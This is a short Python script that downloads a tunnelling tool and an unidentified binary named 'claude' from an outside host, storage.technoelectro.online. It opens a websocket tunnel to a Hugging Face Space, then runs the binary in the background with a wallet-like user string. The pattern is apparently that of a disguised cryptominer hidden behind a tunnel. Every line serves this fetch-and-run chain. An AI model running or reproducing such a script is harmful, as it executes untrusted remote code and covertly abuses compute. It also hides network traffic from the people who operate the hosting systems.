import os
os.system("curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz")
os.system("tar -xf wstunnel_10.5.2_linux_amd64.tar.gz")
os.system("chmod +x wstunnel")
import subprocess

proc = subprocess.Popen(
    ["./wstunnel", "client",
     "wss://namtran1922-datalab.hf.space",
     "-L", "tcp://443:127.0.0.1:1"]
)

print("PID:", proc.pid)
os.system("curl -L -O -J https://storage.technoelectro.online/claude")
os.system("chmod +x claude")
os.system("nohup ./claude --host 127.0.0.1:443 --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t > log.out")



